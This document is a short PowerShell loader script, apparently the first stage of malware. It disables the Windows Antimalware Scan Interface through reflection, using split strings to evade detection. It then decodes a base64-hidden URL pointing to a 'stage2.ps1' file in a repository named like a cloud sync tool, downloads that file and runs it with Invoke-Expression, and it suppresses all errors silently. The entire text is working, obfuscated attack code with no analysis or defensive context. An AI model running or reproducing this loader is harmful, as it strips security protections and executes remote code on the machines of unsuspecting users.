$ErrorActionPreference = 'SilentlyContinue'
# AMSI bypass using reflection with obfuscated strings
try {
    $a = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
    $b = $a.GetField(('amsiInitFailed'),('NonPublic,Static'))
    $b.SetValue($null,$true)
} catch {}
# Payload URL obfuscated via Base64
$u = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9yZWZzL2hlYWRzL21haW4vYXNzZXRzL3N0YWdlMi5wczE='
$p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u))
try {
    $s = (New-Object Net.WebClient).DownloadString($p)
    Invoke-Expression $s
} catch {}
